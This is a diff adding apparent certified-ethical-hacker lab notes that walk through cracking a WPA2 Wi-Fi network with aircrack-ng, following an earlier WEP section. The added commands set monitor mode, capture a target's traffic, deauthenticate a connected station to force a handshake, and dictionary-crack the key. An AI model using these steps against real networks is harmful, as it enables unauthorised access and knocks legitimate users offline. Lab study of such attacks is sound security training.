@@ -26,3 +26,28 @@ aireplay-ng -1 0 -e CEHLabs -a (mac addr) -h (mac add) wlan0mon
 Note: Capture about 15,000 - 20,000 packets then press CTRL+C. 
 
 Launch aircrack-ng WEPcrack-01.cap. And this will find us the key.
+
+2- Cracking a WPAA Network with Aircrack-ng 
+
+
+airmon-ng
+airmon-ng start wlan0
+
+airodump-ng (to get list of detect AP and stations)
+
+airodump-ng wlan0mon
+
+
+airodump-ng --bssid (AP mac add) -c 7 -w WPA2crack wlan0mon
+leave airodump-ng running
+
+open a new terminal and run 
+aireplay-ng -0 2 -a (AP mac add) -c (station mac add) wlan0mon
+
+stop airodump-ng by pressing CTRL+C
+
+NOW CRACK THE KEY. 
+
+aircrack-ng -a2 -b (AP mac address) -w /usr/share/wordlist/2017 WPA2crack-01.cap.
+
+Now the key is cracked.
